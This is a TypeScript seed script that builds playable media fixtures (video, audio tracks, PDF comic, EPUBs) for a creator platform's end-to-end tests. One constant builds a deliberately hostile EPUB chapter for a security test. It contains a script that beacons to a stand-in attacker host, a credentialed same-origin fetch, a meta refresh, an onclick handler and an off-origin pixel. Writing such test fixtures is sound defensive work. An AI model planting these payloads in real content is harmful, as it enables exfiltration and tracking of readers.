// SPDX-License-Identifier: Apache-2.0
/**
 * Seed the **media fixture**: a creator, a video Work, and an album of four audio tracks
 * (one of them gated), all carrying media produced by the real transcode jobs.
 *
 * Why this exists rather than reusing the gauntlet's media — and why that is not a
 * preference — is written down in `packages/db/src/media-fixture.ts`. In one line: the
 * gauntlet fixture is deleted and rebuilt by a suite that runs alongside the one that
 * needs to play it.
 *
 * 🚨 **Idempotent by design, and that is the load-bearing property.** A Work already
 * carrying a `completed` transcode is skipped entirely — no clip, no upload, no ffmpeg. So
 * this is instant on every run after the first, which is what lets a spec call it in
 * `beforeAll` without either paying for an encode or opening a window in which the media
 * is briefly absent. Pass `--force` to rebuild anyway.
 *
 * Uses the same trick as `seed-gauntlet-media.ts`: call `transcodeVideo` / `processAudio`
 * directly rather than through pg-boss, which is not running here. Same code the worker
 * runs, so the output is a genuine HLS ladder and a genuine normalized MP3 with a real
 * waveform.
 *
 * Usage: `bun run db:media-fixture` (or `--force` to re-encode).
 */

import { randomUUID } from "node:crypto";
import { rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { db } from "@anthers/db/client";
import { assertDevCheckout } from "@anthers/db/dev-only";
import {
	DEFAULT_MEDIA_FIXTURE_DESCRIPTION,
	MEDIA_FIXTURE_DISPLAY_NAME,
	MEDIA_FIXTURE_EMAIL,
	MEDIA_FIXTURE_PROJECT,
	MEDIA_FIXTURE_USERNAME,
	MEDIA_FIXTURE_WORKS,
	type MediaFixtureWork,
} from "@anthers/db/media-fixture";
import {
	projectItems,
	projects,
	stripeAccounts,
	transcodingJobs,
	users,
	workCaptionTracks,
	workPages,
	workPanels,
	workSections,
	workSourceFiles,
	works,
} from "@anthers/db/schema";
import { type ProcessingKind, processingFor } from "@anthers/shared/content";
import { rowsRatedAs } from "@anthers/shared/content-rating-fixtures";
import { and, eq } from "drizzle-orm";
import { strToU8, type Zippable, zipSync } from "fflate";
import { ingestEbook } from "../jobs/ingest-ebook.js";
import { processAudio } from "../jobs/process-audio.js";
import { renderPaged } from "../jobs/render-paged.js";
import { transcodeVideo } from "../jobs/transcode-video.js";
import { attachCaptionTrack } from "../services/captions.js";
import { syncProjectRecord } from "../services/creator-record-listing.js";
import { hostedHandleSuffix } from "../services/hosted-accounts.js";
import { storage } from "../services/storage/index.js";
import { urlToKey } from "../services/storage/keys.js";
import { syncWorkListing } from "../services/work-listing.js";
import { createLocalAccount, localHandleName } from "./local-accounts.js";
import { seedVideoThumbnail } from "./seed-thumbnail.js";

const TAG = "[media-fixture]";
const FORCE = process.argv.includes("--force");

/** Matches the gauntlet's clip: short enough to encode fast, tall enough to make a rung. */
const CLIP_SECONDS = 3;
/** Pages in the fixture comic. Four, so a spread view has two full spreads to turn between. */
export const EBOOK_PAGES = 4;
const VIDEO_SIZE = "640x360";

/** Ungated, free, streaming — i.e. Public Access, which is what a player spec wants. */
const OPEN_ACCESS = [{ threshold: 0, allow: true, price: "0" }];
/**
 * Behind $1 given to this creator — any gate will do here, the amount is not the point.
 * The baseline row is present and DENIES, which is
 * what makes it a gate rather than an absence — a Work with no baseline row at all is
 * "free but fully locked", a different state with a different meaning.
 */
const SEED_GATED = [
	{ threshold: 0, allow: false, price: "0" },
	{ threshold: 1, allow: true, price: "0" },
];

async function ffmpegAvailable(): Promise<boolean> {
	try {
		const proc = Bun.spawn(["ffmpeg", "-version"], { stdout: "ignore", stderr: "ignore" });
		return (await proc.exited) === 0;
	} catch {
		return false;
	}
}

/**
 * Generate a clip from ffmpeg's synthetic sources — nothing binary is committed.
 *
 * Each audio track gets its own frequency, so the three are distinguishable by ear when
 * somebody is checking a queue by hand rather than by assertion.
 */
/**
 * A multi-page PDF, generated rather than committed.
 *
 * Four pages of colored test cards, so a user spec can tell page 2 from page 3 by
 * eye — a fixture whose pages are identical cannot show that a page turn happened.
 * Built by rendering images with ffmpeg and stitching with `img2pdf`-free plumbing:
 * ffmpeg writes a PDF directly via its `pdf` muxer where available, and we fall back to
 * a minimal hand-built PDF otherwise, because a system without a PDF writer is common
 * and a fixture that needs one is a fixture that does not run.
 */
async function generatePdf(pages: number): Promise<string> {
	const path = join(tmpdir(), `media_fixture_ebook_${randomUUID()}.pdf`);
	// A minimal, valid, multi-page PDF written by hand. No dependency, no encoder, and
	// completely deterministic — which matters more for a fixture than fidelity does:
	// what the reader spec asserts is that page N renders and page N+1 is different.
	const objects: string[] = [];
	const kids: string[] = [];
	for (let i = 0; i < pages; i++) {
		const contentId = 4 + i * 2;
		const pageId = 3 + i * 2;
		kids.push(`${pageId} 0 R`);
		// Page 1 carries a 2x2 grid of black rectangles separated by white gutters, so
		// rasterize-time panel detection has something to find and the panel-mode e2e
		// has a real layout to walk rather than four whole-page fallbacks. The other
		// pages stay text-only: detection on them returns one whole-page panel each,
		// which is exactly the fallback case the detector is built to handle.
		const stream =
			i === 0
				? [
						"0 0 0 rg",
						"72 500 220 120 re f",
						"320 500 220 120 re f",
						"72 200 220 120 re f",
						"320 200 220 120 re f",
						"BT /F1 14 Tf 92 550 Td (1) Tj ET",
						"BT /F1 14 Tf 340 550 Td (2) Tj ET",
						"BT /F1 14 Tf 92 250 Td (3) Tj ET",
						"BT /F1 14 Tf 340 250 Td (4) Tj ET",
					].join("\n")
				: `BT /F1 48 Tf 72 500 Td (Page ${i + 1}) Tj ET`;
		objects.push(
			`${pageId} 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] ` +
				`/Resources << /Font << /F1 1 0 R >> >> /Contents ${contentId} 0 R >>\nendobj\n`,
		);
		objects.push(
			`${contentId} 0 obj\n<< /Length ${stream.length} >>\nstream\n${stream}\nendstream\nendobj\n`,
		);
	}
	const header = "%PDF-1.4\n";
	const font = "1 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n";
	const pagesObj = `2 0 obj\n<< /Type /Pages /Kids [${kids.join(" ")}] /Count ${pages} >>\nendobj\n`;
	const catalogId = 3 + pages * 2;
	const catalog = `${catalogId} 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n`;
	const body = header + font + pagesObj + objects.join("") + catalog;
	// A `startxref` of 0 with no xref table is tolerated by poppler, which rebuilds the
	// table when it cannot find one — the documented recovery path, and enough for a
	// fixture. `pdfinfo` is what the job calls first, so if this were unreadable the
	// seeder would fail loudly rather than producing a book with no pages.
	const trailer = `trailer\n<< /Size ${catalogId + 1} /Root ${catalogId} 0 R >>\nstartxref\n0\n%%EOF\n`;
	await Bun.write(path, body + trailer);
	return path;
}

/**
 * The fixture's reflow books, as real EPUBs built in memory.
 *
 * 🚨 **They must be books the ingest would extract honestly.** The reader specs read the
 * section/asset ladder the ingest produces, so the container here carries the structure
 * `lib/epub.ts` expects — container.xml, an OPF with a spine, an EPUB 3 nav the titles
 * come from — and the clean book's chapters carry enough prose to paginate across. The
 * hostile book is the security test's subject: a script that beacons outward and
 * same-origin if it ever runs, a meta refresh, an inline handler and an off-origin image.
 */
type EpubEntry = Zippable;

const FIXTURE_CSS = "body { color: #222222; margin: 1rem; }\np { line-height: 1.6; }\n";

/** One chapter's XHTML, well-formed; `extra` lands after the heading, verbatim. */
function fixtureChapter(title: string, marker: string, extra: string[] = []): string {
	const prose = Array.from(
		{ length: 24 },
		(_, i) => `<p>${marker} paragraph ${i + 1}: ${"lorem ipsum dolor sit amet ".repeat(8)}</p>`,
	).join("\n");
	const parts = [
		'<?xml version="1.0" encoding="UTF-8"?>',
		'<html xmlns="http://www.w3.org/1999/xhtml">',
		"<head>",
		`<title>${title}</title>`,
		'<link rel="stylesheet" type="text/css" href="fixture.css"/>',
		...extra,
		"</head>",
		"<body>",
		`<h1>${title}</h1>`,
		`<p>${marker}</p>`,
		prose,
		"</body>",
		"</html>",
	];
	return parts.join("\n");
}

const FIXTURE_NAV = [
	'<?xml version="1.0" encoding="UTF-8"?>',
	'<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">',
	"<head><title>Contents</title></head>",
	"<body>",
	'<nav epub:type="toc" id="toc"><ol>',
	'<li><a href="title.xhtml">Title page</a></li>',
	'<li><a href="ch1.xhtml">Chapter One</a></li>',
	'<li><a href="ch2.xhtml">Chapter Two</a></li>',
	"</ol></nav>",
	"</body>",
	"</html>",
].join("\n");

const FIXTURE_OPF = [
	'<?xml version="1.0" encoding="UTF-8"?>',
	'<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="book-id">',
	'<metadata xmlns:dc="http://purl.org/dc/elements/1.1/">',
	'<dc:identifier id="book-id">urn:uuid:96c14f80-4b1e-4c7f-9c14-fixture-media</dc:identifier>',
	"<dc:title>A book that really reflows</dc:title>",
	"<dc:language>en</dc:language>",
	"<dc:creator>Media Fixture</dc:creator>",
	"</metadata>",
	"<manifest>",
	'<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>',
	'<item id="css" href="fixture.css" media-type="text/css"/>',
	'<item id="title" href="title.xhtml" media-type="application/xhtml+xml"/>',
	'<item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>',
	'<item id="ch2" href="ch2.xhtml" media-type="application/xhtml+xml"/>',
	"</manifest>",
	"<spine>",
	'<itemref idref="title"/>',
	'<itemref idref="ch1"/>',
	'<itemref idref="ch2"/>',
	"</spine>",
	"</package>",
].join("\n");

/** The hostile chapter: everything a scripted EPUB would try, in one body. */
/** The scripted book's structural files differ from the clean one's by their file list. */
const SCRIPTED_OPF = [
	'<?xml version="1.0" encoding="UTF-8"?>',
	'<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="book-id">',
	'<metadata xmlns:dc="http://purl.org/dc/elements/1.1/">',
	'<dc:identifier id="book-id">urn:uuid:96c14f80-4b1e-4c7f-9c14-fixture-hostile</dc:identifier>',
	"<dc:title>A book with hostile chapters</dc:title>",
	"<dc:language>en</dc:language>",
	"<dc:creator>Media Fixture</dc:creator>",
	"</metadata>",
	"<manifest>",
	'<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>',
	'<item id="css" href="fixture.css" media-type="text/css"/>',
	'<item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>',
	'<item id="outro" href="outro.xhtml" media-type="application/xhtml+xml"/>',
	"</manifest>",
	"<spine>",
	'<itemref idref="ch1"/>',
	'<itemref idref="outro"/>',
	"</spine>",
	"</package>",
].join("\n");

const SCRIPTED_NAV = [
	'<?xml version="1.0" encoding="UTF-8"?>',
	'<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">',
	"<head><title>Contents</title></head>",
	"<body>",
	'<nav epub:type="toc" id="toc"><ol>',
	'<li><a href="ch1.xhtml">Hostile chapter</a></li>',
	'<li><a href="outro.xhtml">Closing words</a></li>',
	"</ol></nav>",
	"</body>",
	"</html>",
].join("\n");

/** The hostile chapter: everything a scripted EPUB would try, in one body. */
const HOSTILE_CH1 = [
	'<?xml version="1.0" encoding="UTF-8"?>',
	'<html xmlns="http://www.w3.org/1999/xhtml">',
	"<head>",
	"<title>Hostile chapter</title>",
	'<link rel="stylesheet" type="text/css" href="fixture.css"/>',
	'<meta http-equiv="refresh" content="0;https://attacker.example.test/via-refresh"/>',
	"<style>p.fixture-hostile { background: red; }</style>",
	"</head>",
	"<body>",
	"<h1>Hostile chapter</h1>",
	"<script type=\"text/javascript\">window.addEventListener('load', function () {",
	"  fetch('https://attacker.example.test/collect?via=external');",
	"  fetch('/api/content/works?via=epub-script', { credentials: 'include' });",
	"});</script>",
	'<img src="https://attacker.example.test/pixel.png" alt=""/>',
	"<p onclick=\"fetch('https://attacker.example.test/via-click')\">fixture-ebook-hostile-paragraph</p>",
	"<p>fixture-ebook-scripted paragraph one: lorem ipsum dolor sit amet.</p>",
	"</body>",
	"</html>",
].join("\n");

/** The container's bytes, and their size (`fileSize` the sources table row carries). */
function buildEpub(scripted: boolean): EpubEntry {
	const entries: EpubEntry = {
		mimetype: [new TextEncoder().encode("application/epub+zip"), { level: 0 }],
		"META-INF/container.xml": strToU8(
			'<?xml version="1.0"?>\n<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">\n<rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles>\n</container>\n',
		),
	};
	if (scripted) {
		entries["OEBPS/content.opf"] = strToU8(SCRIPTED_OPF);
		entries["OEBPS/nav.xhtml"] = strToU8(SCRIPTED_NAV);
		entries["OEBPS/ch1.xhtml"] = strToU8(HOSTILE_CH1);
		entries["OEBPS/outro.xhtml"] = strToU8(
			fixtureChapter("Closing words", "fixture-ebook-scripted-outro"),
		);
	} else {
		entries["OEBPS/content.opf"] = strToU8(FIXTURE_OPF);
		entries["OEBPS/nav.xhtml"] = strToU8(FIXTURE_NAV);
		entries["OEBPS/title.xhtml"] = strToU8(
			fixtureChapter("Title page", "fixture-ebook-title-page"),
		);
		entries["OEBPS/ch1.xhtml"] = strToU8(
			fixtureChapter("Chapter One", "fixture-ebook-chapter-one"),
		);
		entries["OEBPS/ch2.xhtml"] = strToU8(
			fixtureChapter("Chapter Two", "fixture-ebook-chapter-two"),
		);
	}
	entries["OEBPS/fixture.css"] = strToU8(FIXTURE_CSS);
	return entries;
}

const epubCache = new Map<boolean, Uint8Array>();

/** The EPUB's bytes; cached, so `epubSize` and the upload agree without recompressing. */
function generateEpub(scripted: boolean): Uint8Array {
	let bytes = epubCache.get(scripted);
	if (!bytes) {
		bytes = zipSync(buildEpub(scripted));
		epubCache.set(scripted, bytes);
	}
	return bytes;
}

const epubSize = (scripted: boolean) => generateEpub(scripted).length;

async function generateClip(kind: "video" | "audio", hz: number): Promise<string> {
	const path = join(
		tmpdir(),
		`media_fixture_${kind}_${randomUUID()}.${kind === "video" ? "mp4" : "mp3"}`,
	);
	const args =
		kind === "video"
			? [
					"ffmpeg",
					"-y",
					"-f",
					"lavfi",
					"-i",
					`testsrc=duration=${CLIP_SECONDS}:size=${VIDEO_SIZE}:rate=15`,
					"-f",
					"lavfi",
					"-i",
					`sine=frequency=${hz}:duration=${CLIP_SECONDS}`,
					"-c:v",
					"libx264",
					"-preset",
					"ultrafast",
					"-pix_fmt",
					"yuv420p",
					"-c:a",
					"aac",
					"-shortest",
					path,
				]
			: [
					"ffmpeg",
					"-y",
					"-f",
					"lavfi",
					"-i",
					`sine=frequency=${hz}:duration=${CLIP_SECONDS}`,
					"-c:a",
					"libmp3lame",
					path,
				];

	const proc = Bun.spawn(args, { stdout: "ignore", stderr: "pipe" });
	if ((await proc.exited) !== 0) {
		throw new Error(
			`ffmpeg failed generating the ${kind} clip:\n${await new Response(proc.stderr).text()}`,
		);
	}
	return path;
}

/** Create the fixture creator if absent; return its id either way. */
async function ensureCreator(): Promise<number> {
	const [existing] = await db
		.select({ id: users.id })
		.from(users)
		.where(
			eq(
				users.atprotoHandle,
				`${localHandleName(MEDIA_FIXTURE_USERNAME)}.${await hostedHandleSuffix()}`,
			),
		)
		.limit(1);
	if (existing) return existing.id;

	const created = await createLocalAccount({
		email: MEDIA_FIXTURE_EMAIL,
		handleName: MEDIA_FIXTURE_USERNAME,
		emailVerified: true,
		fields: {
			displayName: MEDIA_FIXTURE_DISPLAY_NAME,
			bio: "A fixture creator whose Works carry real, playable media.",
			isCreator: true,
			// Terms accepted: the authed suites signed in as this fixture drive the app
			// itself, not onboarding, and a terms-owing account is rerouted to /welcome.
			termsAcceptedAt: new Date(),
		},
	});
	console.log(`${TAG} created creator "${MEDIA_FIXTURE_USERNAME}" (id ${created.id})`);
	return created.id;
}

/**
 * Give the fixture creator a payout-ready Stripe account.
 *
 * 🚨 **Releasing a Work requires completed payout setup since 2026-08-28**, so without this
 * the fixture creator cannot release anything and `work-release.authed.e2e.ts` — the walk
 * that every other Catalog assertion rests on — fails at the release checkbox, which the
 * Studio now disables. That is the gate working; this is the fixture catching up to it.
 *
 * **Reconciled rather than created-if-missing**, on the same reasoning the Works below use:
 * a machine whose `media_fixture` account predates the gate would otherwise keep an account
 * with no payout setup forever, and see a failure a fresh clone never reproduces.
 *
 * ⚠️ Sibling of `__tests__/payouts-fixture.ts`, deliberately not shared with it — that one
 * seeds a unit-test database and this one seeds the dev/e2e database. Both write the row
 * directly because Connect onboarding is a hosted flow with an identity check in it, and
 * there is nothing to stub that would make either more honest.
 */
async function ensurePayouts(userId: number): Promise<void> {
	await db
		.insert(stripeAccounts)
		.values({
			userId,
			stripeAccountId: `acct_fixture_${userId}`,
			onboardingComplete: true,
			payoutsEnabled: true,
			chargesEnabled: true,
		})
		.onConflictDoUpdate({
			target: stripeAccounts.userId,
			set: { onboardingComplete: true, payoutsEnabled: true, chargesEnabled: true },
		});
}

/**
 * Create the Work row if absent, and **reconcile** it if present.
 *
 * 🚨 Reconcile rather than skip. The fields below are what the fixture *declares* — its
 * title, its gates, its words — so a create-if-missing seeder means changing the
 * declaration diverges silently: a fresh machine gets the new fixture while yours keeps
 * the old one, and a spec that passes here fails in CI for reasons neither of you can see.
 * Same defect the dev-account bootstrap had until it started reconciling.
 *
 * The media is deliberately NOT reconciled here — that is the expensive part, and
 * `alreadyPlayable` decides it separately.
 */
async function ensureWork(spec: MediaFixtureWork, creator: number): Promise<number> {
	const access = spec.gated ? SEED_GATED : OPEN_ACCESS;
	// 🚨 Looked up by SLUG ALONE, not by (creator, slug). `works.slug` is globally unique
	// and these are namespaced with `media-fixture-`, so slug is the real identity — while
	// matching on the creator too makes the seeder unable to find a Work whose creator has
	// changed, so it tries to INSERT and dies on the unique index instead. That is not
	// hypothetical: reassigning one by hand to try something out was enough to wedge the
	// whole fixture, and the error named the insert rather than the cause. `creatorId` is
	// reconciled below for the same reason everything else here is.
	const [existing] = await db
		.select({ id: works.id })
		.from(works)
		.where(eq(works.slug, spec.slug))
		.limit(1);
	if (existing) {
		await db
			.update(works)
			.set({
				creatorId: creator,
				title: spec.title,
				access: access,
				lyrics: spec.lyrics ?? "",
				description: spec.description ?? DEFAULT_MEDIA_FIXTURE_DESCRIPTION,
			})
			.where(eq(works.id, existing.id));
		return existing.id;
	}

	const [created] = await db
		.insert(works)
		.values({
			creatorId: creator,
			publicId: spec.publicId,
			slug: spec.slug,
			type: spec.media,
			title: spec.title,
			description: spec.description ?? DEFAULT_MEDIA_FIXTURE_DESCRIPTION,
			lyrics: spec.lyrics ?? "",
			visibility: "released",
			// Seeded Works stand for properly released ones, and release is gated on a
			// declared rating with every row of its matrix answered AND on a credit naming a
			// human (`credits_creator_required`) — released states neither gate would produce.
			credits: [{ role: "Made by", contributor: "The Fixture Creator", types: ["created"] }],
			// Every row Not in It, which is General.
			maturity: "general",
			maturityRows: rowsRatedAs("general"),
			maturitySource: "creator",
			releasedAt: new Date(),
			streamEnabled: true,
			downloadEnabled: false,
			access: access,
		})
		.returning({ id: works.id });
	return created.id;
}

/**
 * The video Work's caption track — an English VTT the player spec's CC assertions read.
 *
 * Idempotent, and deliberately BEFORE the `alreadyPlayable` early return above: a fixture
 * seeded on an older branch has working media and no captions, and a skip that stood for
 * the whole function would hold that gap open forever. Re-runs are handled by the attach
 * service's own replace-by-language rule, so calling this from `FORCE` re-seeds too.
 *
 * Attached through `attachCaptionTrack`, not a bare insert — one path for the write, and
 * the fixture bytes validated by the same gate a creator's upload passes.
 */
async function ensureVideoCaptions(
	spec: MediaFixtureWork,
	creator: number,
	workId: number,
): Promise<void> {
	if (spec.media !== "video") return;
	const [existing] = await db
		.select()
		.from(workCaptionTracks)
		.where(eq(workCaptionTracks.workId, workId))
		.limit(1);
	if (existing) return;
	const work = (await db.select().from(works).where(eq(works.id, workId)).limit(1))[0];
	const key = `creators/${creator}/captions/${workId}/fixture-en.vtt`;
	await storage.upload(
		key,
		new Uint8Array(Buffer.from(FIXTURE_VTT, "utf-8")),
		"text/vtt",
		"private",
	);
	await attachCaptionTrack({
		work,
		requesterId: creator,
		key,
		language: "en",
		label: "English (fixture)",
	});
	console.log(`${TAG} ${spec.key} caption track attached (en)`);
}

const FIXTURE_VTT = `WEBVTT

00:00:01.000 --> 00:00:02.500
A tone, from the fixture that really plays.

00:00:03.000 --> 00:00:06.000
Still a tone.
`;

/** Whether a Work already carries the media its spec needs, so the encode/ingest can be skipped. */
async function alreadyPlayable(workId: number, reflow: boolean): Promise<boolean> {
	const [job] = await db
		.select({
			status: transcodingJobs.status,
			mediaType: transcodingJobs.mediaType,
			hlsManifestUrl: transcodingJobs.hlsManifestUrl,
		})
		.from(transcodingJobs)
		.where(eq(transcodingJobs.workId, workId))
		.limit(1);
	if (job?.status !== "completed") return false;
	// A reflow book's playable state is its extracted sections; a seeded EPUB that
	// extracted has a full spine and the reader specs read the ladder from it.
	if (reflow) {
		const [row] = await db
			.select({ id: workSections.id })
			.from(workSections)
			.where(eq(workSections.workId, workId))
			.limit(1);
		return row != null;
	}
	// A completed-from-before-the-rendition video is not playable in the sense the browser
	// suite needs — the Podcast-This row is gated on `audio.m3u8` existing in storage,
	// and a fixture seeded on an older branch has no such object. Re-encode it.
	if (job.mediaType === "video" && job.hlsManifestUrl) {
		const prefix = urlToKey(job.hlsManifestUrl).replace(/\/[^/]+$/, "");
		return await storage.exists(`${prefix}/audio.m3u8`);
	}
	// A comic/ebook whose rasterize ran before the panel detector shipped has pages but
	// no `work_panels` rows, which is exactly the case the reader spec exercises — and
	// reads as a broken Work rather than as an old fixture. Re-rasterize it.
	if (job.mediaType === "ebook") {
		const [panelRow] = await db
			.select({ id: workPanels.id })
			.from(workPanels)
			.innerJoin(workPages, eq(workPanels.pageId, workPages.id))
			.where(eq(workPages.workId, workId))
			.limit(1);
		return panelRow != null;
	}
	return true;
}

async function seedMediaFor(spec: MediaFixtureWork, creator: number): Promise<void> {
	const workId = await ensureWork(spec, creator);
	await ensureVideoCaptions(spec, creator, workId);

	if (!FORCE && (await alreadyPlayable(workId, spec.media === "ebook"))) {
		console.log(`${TAG} ${spec.key} already playable — skipped`);
		return;
	}

	await db.delete(transcodingJobs).where(eq(transcodingJobs.workId, workId));

	// The fixture's types are all processed ones, so this is never null.
	const processing = processingFor(spec.media) as ProcessingKind;
	// 440 Hz for the video, then a rising scale for the tracks, so a person listening to
	// the queue can hear it advance.
	const hz = processing === "video" ? 440 : 440 + spec.trackNumber * 110;
	// A reflow book's source is a real EPUB uploaded into the set — it goes through the
	// real ingest, the same queue and the same caps an upload does, so the rows the
	// reader specs read are the rows the pipeline produces.
	const reflow = spec.media === "ebook";
	const clipPath = reflow
		? null
		: processing === "ebook"
			? await generatePdf(EBOOK_PAGES)
			: await generateClip(processing, hz);
	try {
		const ext = processing === "video" ? "mp4" : processing === "ebook" ? "pdf" : "mp3";
		const sourceKey = reflow
			? `creators/${creator}/ebook/source/${randomUUID().replace(/-/g, "")}.epub`
			: `creators/${creator}/${processing}/source/${randomUUID().replace(/-/g, "")}.${ext}`;
		// Sources are private: only derived, access-checked deliverables are ever served.
		await storage.upload(
			sourceKey,
			reflow
				? generateEpub(spec.scripted ?? false)
				: new Uint8Array(await Bun.file(clipPath as string).arrayBuffer()),
			processing === "video"
				? "video/mp4"
				: reflow
					? "application/epub+zip"
					: processing === "ebook"
						? "application/pdf"
						: "audio/mpeg",
			"private",
		);
		await db.update(works).set({ sourceKey, updatedAt: new Date() }).where(eq(works.id, workId));

		if (reflow) {
			// A real set row, because the ingest reads the table through `listSourceFiles`
			// — whose legacy-attach fallback hardcodes the PDF mime, which an EPUB must not
			// inherit (`isEpubSource` would read it as a PDF and refuse the set).
			await db.delete(workSourceFiles).where(eq(workSourceFiles.workId, workId));
			await db.insert(workSourceFiles).values({
				workId,
				position: 0,
				file: sourceKey,
				filename: `${spec.key}.epub`,
				fileSize: epubSize(spec.scripted ?? false),
				mimeType: "application/epub+zip",
			});
		}

		const [job] = await db
			.insert(transcodingJobs)
			.values({ workId, mediaType: processing, status: "pending", progress: 0 })
			.returning({ id: transcodingJobs.id });

		if (reflow) await ingestEbook({ jobId: job.id });
		else if (processing === "video") {
			await transcodeVideo({ jobId: job.id });
			await seedVideoThumbnail(workId, creator, clipPath as string);
		} else if (processing === "ebook") await renderPaged({ jobId: job.id });
		else await processAudio({ jobId: job.id });

		const [done] = await db
			.select()
			.from(transcodingJobs)
			.where(eq(transcodingJobs.id, job.id))
			.limit(1);
		if (done?.status !== "completed") {
			throw new Error(
				`${TAG} ${spec.key} ${spec.media} job finished as "${done?.status}": ${done?.errorMessage || "no error recorded"}`,
			);
		}
		console.log(`${TAG} ${spec.key} (${spec.slug}) → real ${spec.media}, work ${workId}`);
	} finally {
		if (clipPath) await rm(clipPath, { force: true });
	}
}

/** Put the music Works on the album's shelf, in track order. */
async function ensureProject(creator: number): Promise<void> {
	let [project] = await db
		.select({ id: projects.id })
		.from(projects)
		.where(and(eq(projects.creatorId, creator), eq(projects.slug, MEDIA_FIXTURE_PROJECT.slug)))
		.limit(1);
	if (!project) {
		[project] = await db
			.insert(projects)
			.values({
				creatorId: creator,
				slug: MEDIA_FIXTURE_PROJECT.slug,
				title: MEDIA_FIXTURE_PROJECT.title,
				description: MEDIA_FIXTURE_PROJECT.description,
				isPublished: true,
			})
			.returning({ id: projects.id });
	}

	for (const spec of MEDIA_FIXTURE_WORKS) {
		if (spec.media !== "music") continue;
		const [work] = await db
			.select({ id: works.id })
			.from(works)
			.where(and(eq(works.creatorId, creator), eq(works.slug, spec.slug)))
			.limit(1);
		if (!work) continue;
		// Upsert on the pair, so a re-run corrects an order rather than duplicating a row.
		await db
			.insert(projectItems)
			.values({ projectId: project.id, workId: work.id, sortOrder: spec.trackNumber })
			.onConflictDoUpdate({
				target: [projectItems.projectId, projectItems.workId],
				set: { sortOrder: spec.trackNumber },
			});
	}
}

/**
 * Write the fixture's listings into its creator's repository on the session's network.
 *
 * ⭐ **Through the services the listing jobs run**, so what lands is exactly the record a released
 * Work and a published project produce in production, and a session opens with a catalog that is
 * really on its network rather than rows that only claim to be. Each call decides for itself, so a
 * gated or unreleased Work is left alone the way the job would leave it.
 */
async function publishRecords(creatorId: number): Promise<void> {
	const owned = await db
		.select({ id: works.id, slug: works.slug })
		.from(works)
		.where(eq(works.creatorId, creatorId));
	const outcomes: string[] = [];
	for (const work of owned) {
		const result = await syncWorkListing(work.id);
		outcomes.push(`${work.slug}: ${result.status}`);
	}
	const [project] = await db
		.select({ id: projects.id })
		.from(projects)
		.where(eq(projects.slug, MEDIA_FIXTURE_PROJECT.slug))
		.limit(1);
	if (project) {
		const result = await syncProjectRecord(project.id);
		outcomes.push(`${MEDIA_FIXTURE_PROJECT.slug}: ${result.status}`);
	}
	console.log(`${TAG} records — ${outcomes.join(", ")}`);
}

async function main() {
	assertDevCheckout();

	if (!(await ffmpegAvailable())) {
		console.warn(
			`${TAG} ffmpeg not found — SKIPPING media seeding.\n${TAG} Specs that need playable bytes will fail; install ffmpeg to cover them.`,
		);
		return;
	}

	const creator = await ensureCreator();
	await ensurePayouts(creator);
	for (const spec of MEDIA_FIXTURE_WORKS) await seedMediaFor(spec, creator);
	await ensureProject(creator);
	await publishRecords(creator);
	console.log(
		`${TAG} ${MEDIA_FIXTURE_WORKS.length} Work(s) ready under "${MEDIA_FIXTURE_USERNAME}"`,
	);
}

main()
	.then(() => process.exit(0))
	.catch((error) => {
		console.error(`${TAG} failed:`, error);
		process.exit(1);
	});
